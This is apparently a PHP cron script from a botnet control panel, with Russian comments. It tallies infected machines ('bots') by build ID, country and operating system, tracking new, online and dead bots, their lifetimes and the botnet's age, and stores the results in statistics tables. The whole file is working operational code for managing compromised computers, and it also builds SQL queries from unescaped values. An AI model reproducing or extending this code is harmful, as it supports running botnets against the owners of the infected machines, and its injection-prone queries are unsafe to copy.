<?php

define('APP_ROOT_PATH', dirname(__FILE__).'/..');

require(APP_ROOT_PATH.'/config.php');
require(APP_ROOT_PATH.'/common.php');

Db_Mysql::init(MYSQL_HOST, MYSQL_LOGIN, MYSQL_PASSWORD, MYSQL_DB);

$db = Db_Mysql::getInstance();
$db -> query('SET NAMES "utf8" COLLATE "utf8_unicode_ci";');
$db -> debug = false;

error_reporting(0);

function GetOption($name)
{
    global $db;
    $d = $db->query("SELECT data FROM options WHERE name='{$name}'")->fetchAssoc();
    return $d['data'];
}

cronUpdateDaily($db, GetOption('delay'), GetOption('alive'));

$db -> close();

function cronUpdateDaily($db, $botOnlineMinutes, $botToDeadDays)
{
    $step = 500;
    $limit = 0;

    echo 'delay time: '. $botOnlineMinutes.' - dead time: '.$botToDeadDays. '<br>';

    while (true)
    {
        $bots = $db -> query("SELECT `botAdded`, `botAccess`, `botCountry`, `botSystem`, `botBuildId` FROM bots WHERE 1 LIMIT $limit, $step"); 
        $botsArray = $bots -> fetchAllAssoc();
        $db -> freeResult();
        if (!is_array($botsArray) || !count($botsArray))
        {
            break;
        }
        
        foreach ($botsArray as $bot)
        {
            $now = strtotime('now');

            // Считаем общеее кол-во ботов по дате
            $daily[$bot['botBuildId']]['dayBots'] += 1;
            $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBots'] += 1;

            // Дата
            $daily[$bot['botBuildId']]['dayDate'] = date('Y-m-d', $now);

            // Если дата добавления бота равна текущей считаем бота новым
            if (date('Y-m-d', $bot['botAdded']) == $daily[$bot['botBuildId']]['dayDate'])
            {
                $daily[$bot['botBuildId']]['dayBotsNew'] += 1;
            }
            else
            {
                $daily[$bot['botBuildId']]['dayBotsNew'] += 0;
            }

            // Если последний раз бот стучал НЕ менее 15 минут назад считаем его как онлайн
            if ($bot['botAccess'] >= strtotime("-$botOnlineMinutes minutes"))
            {
                $daily[$bot['botBuildId']]['dayBotsOnline'] += 1;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsOnline'] += 1;
            }
            else
            {
                $daily[$bot['botBuildId']]['dayBotsOnline'] += 0;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsOnline'] += 0;
            }

            // Если последний раз бот стучал МЕНЕЕ 3х дней назад считаем его как мертвого.
            if ($bot['botAccess'] < strtotime("-$botToDeadDays days"))
            {
                $daily[$bot['botBuildId']]['dayBotsDead'] += 1;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsDead'] += 1;

                // И его лайфтайм вычисляем относительно времени первого отстука, так как мы считаем его мертвым.
                $daily[$bot['botBuildId']]['dayBotsLifeTime'] += (($bot['botAccess'] - $bot['botAdded']) / 86400) + 1;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsLifeTime'] += (($bot['botAccess'] - $bot['botAdded']) / 86400) + 1;
                // Например если бот стучал всего час будем считать что он прожил один день.
            }
            else
            {
                $daily[$bot['botBuildId']]['dayBotsDead'] += 0;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsDead'] += 0;
                
                // Так как тут мы считаем бота живым, вычисляем его лайфтайм относительно текущего времени.
                $daily[$bot['botBuildId']]['dayBotsLifeTime'] += (($now - $bot['botAdded']) / 86400) + 1;
                $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsLifeTime'] += (($now - $bot['botAdded']) / 86400) + 1;
                // Например если бот стучал всего 2 дня, а сейчас идет 4 день будем считать что он прожил 4 деня так как мы его считаем живым.
            }

            // Вычисляем общее время жизни ботнета в днях
            $daily[$bot['botBuildId']]['dayBotsNetTime'] += (($now - $bot['botAdded']) / 86400) + 1;
            $stat[$bot['botBuildId']][$bot['botCountry']][$bot['botSystem']]['statBotsNetTime'] += (($now - $bot['botAdded']) / 86400) + 1;
        }

        unset($botsArray);

        $limit += $step;
    }

    echo "<pre>";print_r($stat);

    if (is_array($stat) && count($stat))
    {
        $db -> query("DELETE FROM `stats`");

        foreach($stat as $BuildId => $BuildArray)
        {
            foreach($BuildArray as $Country => $CountryArray)
            {
                foreach($CountryArray as $System => $stat)
                {
                    $s = array
                    (
                        'statBuildId' => $BuildId,
                        'statCountry' => $Country,
                        'statSystem' => $System,
                        'statBots' => $stat['statBots'],
                        'statBotsDead' => $stat['statBotsDead'],
                        'statBotsOnline' => $stat['statBotsOnline'],
                        'statBotsLifeTime' => $stat['statBotsLifeTime'],
                        'statBotsNetTime' => $stat['statBotsNetTime']
                    );

                    $db -> insert('stats', $s);
                }
            }
        }
    }

    if (is_array($daily) && count($daily))
    {
        foreach($daily as $BuildId => $d)
        {
            $first = false;

            $online = $db -> query("SELECT `dayBotsMaxOnline`, `dayBotsMinOnline` FROM daily WHERE dayDate = '{$d['dayDate']}' AND dayBuildId = '$BuildId'");
            if ($online)
            {
                $onlineArray = $online -> fetchAssoc();
                $db -> freeResult();
                if (!is_array($onlineArray) || !count($onlineArray))
                {
                    $first = true;

                    $onlineArray['dayBotsMaxOnline'] = $d['dayBotsOnline'];
                    $onlineArray['dayBotsMinOnline'] = $d['dayBotsOnline'];
                }
            }

            $d['dayBotsMaxOnline'] = $d['dayBotsOnline'] > $onlineArray['dayBotsMaxOnline'] ? $d['dayBotsOnline'] : $onlineArray['dayBotsMaxOnline'];
            $d['dayBotsMinOnline'] = $d['dayBotsOnline'] < $onlineArray['dayBotsMinOnline'] ? $d['dayBotsOnline'] : $onlineArray['dayBotsMinOnline'];

            unset($onlineArray);

            if ($first)
            {
                $d['dayBuildId'] = $BuildId;
                $db -> insert('daily', $d);
            }
            else
            {
                $dayDate = $d['dayDate'];
                unset($d['dayDate']);

                $db -> update('daily', $d, "dayDate = '$dayDate' AND dayBuildId = '$BuildId'");
            }
        }
    }
}

?>
